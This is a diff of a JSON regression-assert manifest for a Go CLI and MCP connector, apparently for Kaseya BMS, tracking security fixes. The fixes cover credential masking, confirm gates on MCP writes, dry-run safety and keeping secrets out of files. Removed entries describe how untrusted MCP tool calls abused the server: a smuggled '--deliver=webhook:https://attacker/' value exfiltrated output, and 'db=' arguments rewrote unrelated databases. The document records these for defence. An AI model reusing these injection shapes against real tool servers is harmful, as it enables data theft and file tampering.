@@ -14,7 +14,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -36,6 +36,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -139,358 +169,1051 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path) (plus 1 more, see why)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path); the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "contains": "return mcplib.NewToolResultError(fmt.Sprintf(\"refusing %q: it names a file on the machine running the MCP server",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "not_contains": "multipartFileFields[binding.WireName] = fmt.Sprintf(\"%v\", v)"
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
+   "id": "no-response-cache",
    "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "summary": "The on-disk response cache is off on every client: raw Kbms bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (kbms_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to kbms from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-never-keeps-secrets",
+   "class": "secret-echo",
+   "summary": "Every resource write passes mergeIncomingResourceData, which redacts credential-named values (cliutil.SecretFieldName) at any depth; a value this process holds never reaches the store because every handle opens through the kit's SQLite driver (credkit-sqlite-every-handle), which refuses the statement.",
+   "why": "Work order: no credential in files. store.go carries 4 lines re-applied by tools/apply_credential_rules.py; Open uses WithholdingSQLiteDriver (hand file internal/store/kbms_withhold_driver.go, from the cisco-umbrella Codex r1 class store-write-bypasses-chokepoint). The class credential-split-across-sql-bindings is left to the fleet credential filter the publish step adopts (orchestrator ruling 2026-10-27). Covered by TestNoCredentialInAnyWrittenFile (.db files scanned) and TestStoreRedactsCredentialNamedValuesNotHeld. Ported to kbms from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return withoutStoredSecrets(s.mergeIncomingResourceDataRaw(tx, resourceType, id, incoming))",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/store/kbms_secrets.go",
+     "contains": "if err := enc.Encode(cliutil.RedactSecretFields(v)); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/credkit_split_test.go",
+     "contains": "func TestCredentialSplitAcrossBindingsNeverPersists(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Kbms state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/kbms_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to kbms from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/kbms_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/kbms_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to kbms from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Kbms whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "inner = dryRunTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/kbms_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Kbms: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/kbms_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/kbms_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "status": "active",
+   "summary": "config.toml never holds a credential: every value it keeps passes persistedWithoutCredentials (base_url and token_url lose their userinfo and every credential-named or held query value; a credential-named header, or one repeating a configured or environment credential, is left out) and the write is refused when the file still repeats any held value; the legacy scrub writes through the same filter. The 0600 credential store is unchanged.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `KASEYA_BMS_BASE_URL='https://api.bms.kaseya.com?api_key=X' auth set-token` wrote X (and a userinfo password, a held secret under any query name, a token_url query secret) into config.toml, because the generated save persists base_url and token_url as configured. Work order credential rule: nothing but the 0600 credential store holds a credential. Hand file internal/config/kbms_persist.go; three anchored lines in the generated config.go (tools/apply_credential_rules.py). TestConfigFileNeverHoldsACredential failed on the generated save (seen/r1-config-file-credential-seen-failing.log). Ported to kbms from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "persist = persistedWithoutCredentials(persisted.persisted(), c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := refuseCredentialInConfigFile(data, c); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "scrubbed := persistedWithoutCredentials(legacy.persisted(), c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if refuseCredentialInConfigFile(scrubbedData, c) != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_persist.go",
+     "contains": "func persistedWithoutCredentials(p persistedConfig, c *Config) persistedConfig {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_persist.go",
+     "contains": "func refuseCredentialInConfigFile(data []byte, c *Config) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_persist.go",
+     "contains": "if cliutil.Held(string(rest)) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_persist.go",
+     "contains": "func urlWithoutCredentials(raw string) (clean string, changed bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/kbms_secrets.go",
+     "contains": "_, err := credkit.NewWriter(&buf, credkit.SinkFile).Write([]byte(s))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_persist_test.go",
+     "contains": "func TestSavedConfigFileKeepsNoCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its (withholding) output file on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to kbms from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/export_writefail_test.go",
+     "contains": "func TestExportOutputWriteFailureFailsTheCommand(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-changes-nothing",
+   "status": "active",
+   "summary": "--dry-run changes no local file: auth set-token saves nothing, auth logout clears nothing, export --output leaves the file alone (the preview goes to stdout)",
